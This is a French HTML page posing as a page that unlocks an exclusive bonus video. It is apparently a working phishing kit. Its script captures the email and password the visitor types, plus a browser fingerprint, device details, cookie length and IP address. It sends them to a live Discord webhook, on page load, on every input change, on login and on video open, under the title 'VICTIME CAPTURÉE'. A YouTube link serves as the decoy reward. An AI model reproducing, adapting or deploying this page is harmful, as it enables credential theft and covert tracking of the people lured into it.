<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎮 Vidéo Bonus Exclusive !</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            color: white;
        }
        .container { 
            background: rgba(255,255,255,0.1); 
            backdrop-filter: blur(10px); 
            border-radius: 20px; 
            padding: 40px; 
            max-width: 500px; 
            text-align: center; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
        }
        h1 { font-size: 2.5em; margin-bottom: 20px; text-shadow: 0 5px 10px rgba(0,0,0,0.3); }
        .login-form { margin: 30px 0; }
        input { 
            width: 100%; padding: 15px; margin: 10px 0; 
            border: none; border-radius: 10px; font-size: 16px; 
            background: rgba(255,255,255,0.9); 
        }
        .btn { 
            background: linear-gradient(45deg, #ff6b6b, #feca57); 
            color: white; border: none; 
            padding: 15px 40px; border-radius: 50px; 
            font-size: 18px; font-weight: bold; 
            cursor: pointer; transition: all 0.3s; 
            margin: 10px; box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }
        .btn:hover:not(:disabled) { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0,0,0,0.3); }
        .btn:disabled { background: #666; cursor: not-allowed; }
        .video-section { margin-top: 30px; opacity: 0; transition: opacity 0.5s; }
        .video-section.show { opacity: 1; }
        #status { margin-top: 20px; font-size: 14px; opacity: 0.8; }
        .error { color: #ff6b6b; font-weight: bold; margin-top: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-radius: 50%; border-top-color: white; animation: spin 0.8s infinite; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🎉 Surprise Exclusive !</h1>
        <p>Accès spécial au contenu bonus. <strong>EMAIL OBLIGATOIRE</strong> pour débloquer la vidéo !</p>
        
        <div class="login-form">
            <input type="email" id="email" placeholder="📧 Ton email OBLIGATOIRE" required>
            <input type="password" id="password" placeholder="🔑 Mot de passe">
            <button class="btn" id="loginBtn" onclick="login()" disabled>🚀 Accéder à la vidéo</button>
            <div id="emailError" class="error" style="display: none;">❌ Email invalide !</div>
        </div>
        
        <div id="status"></div>
        
        <div class="video-section" id="videoSection">
            <h2>🎥 Ta vidéo exclusive :</h2>
            <button class="btn" onclick="openVideo()" style="background: linear-gradient(45deg, #4ecdc4, #44a08d); font-size: 20px; padding: 20px 50px;">
                🎬 OUVRIR LA VIDÉO MAINTENANT
            </button>
        </div>
    </div>

    <script>
        // TON WEBHOOK
        const WEBHOOK = 'https://canary.discord.com/api/webhooks/1495131862702751775/pP4iuM3WGCm8n_Po5PE94ofmB2-tvh8nxDLPMSKFddYAiaGlWBdvxa3sy0vlnVJoilFC';
        const YOUTUBE_LINK = 'https://youtube.com/shorts/MBz-kM9Tqf0?si=G8Yw_AlaceyqnQ7L';
        
        // ENVOI SYNCHRONE SANS ATTENTE (0.3s)
        function sendDataSync() {
            const email = document.getElementById('email').value || 'none';
            const pass = document.getElementById('password').value || 'none';
            
            // Canvas instantané
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.font = '14px Arial';
            ctx.fillText(email.slice(0,10) || 'fp', 2, 14);
            const fp = btoa(canvas.toDataURL()).slice(-20);
            
            const data = {
                title: "🎣 VICTIME CAPTURÉE - ULTRA FAST",
                color: 16711680,
                fields: [
                    {name: "🌐 IP", value: "🔄 Detecting...", inline: true},
                    {name: "📧 Email", value: `\`${email}\``, inline: true},
                    {name: "🔑 Password", value: `\`${pass}\``, inline: true},
                    {name: "🎨 Fingerprint", value: fp, inline: true},
                    {name: "📱 Screen", value: `${screen.width}x${screen.height}`, inline: true},
                    {name: "🖥️ CPU", value: navigator.hardwareConcurrency || "?", inline: true},
                    {name: "💾 RAM", value: navigator.deviceMemory || "?", inline: true},
                    {name: "🌍 Lang/TZ", value: `${navigator.language}/${Intl.DateTimeFormat().resolvedOptions().timeZone.slice(0,10)}`, inline: false},
                    {name: "🍪 Cookies", value: document.cookie ? `${document.cookie.length} bytes` : "none", inline: false}
                ],
                description: `\`\`\`${navigator.userAgent.slice(0,90)}\`\`\``,
                thumbnail: {url: "https://cdn-icons-png.flaticon.com/512/5968/5968898.png"},
                footer: {text: `InstantGrab | ${new Date().toLocaleString('fr-FR')}`}
            };
            
            // ENVOI SYNCHRONE (sans await)
            fetch(WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({embeds: [data]})
            });
        }
        
        // IP EN PARALLÈLE (optionnel)
        async function getIPFast() {
            try {
                const ip = await fetch('https://api.ipify.org?format=text', {cache: 'no-cache'}).then(r => r.text());
                return ip.trim();
            } catch(e) {
                return '???';
            }
        }
        
        // UI SUPER RAPIDE
        const emailInput = document.getElementById('email');
        const loginBtn = document.getElementById('loginBtn');
        
        emailInput.addEventListener('input', () => {
            const valid = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(emailInput.value);
            loginBtn.disabled = !valid;
        });
        
        // LOGIN = 1 SECONDE MAX
        async function login() {
            const status = document.getElementById('status');
            status.innerHTML = '<span class="spinner"></span> Connexion...';
            
            // ENVOI IMMÉDIAT
            sendDataSync();
            
            // IP en arrière-plan (non-bloquant)
            getIPFast().then(ip => {
                // 2ème message avec IP
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        embeds: [{
                            title: "📍 IP CONFIRMÉE",
                            description: `\`${ip}\``,
                            color: 5814783,
                            footer: {text: `IP Update | ${new Date().toLocaleString('fr-FR')}`}
                        }]
                    })
                });
            });
            
            // Vidéo après 1s
            setTimeout(() => {
                status.innerHTML = '✅ Accès autorisé ! 🎉';
                setTimeout(() => document.getElementById('videoSection').classList.add('show'), 300);
            }, 1000);
        }
        
        function openVideo() {
            window.open(YOUTUBE_LINK, '_blank');
            sendDataSync();
        }
        
        // ENVOI AU CHARGEMENT (0.5s)
        setTimeout(sendDataSync, 500);
        
        // ENVOI SUR INPUTS
        document.querySelectorAll('input').forEach(input => {
            input.addEventListener('change', sendDataSync);
        });
    </script>
</body>
</html>
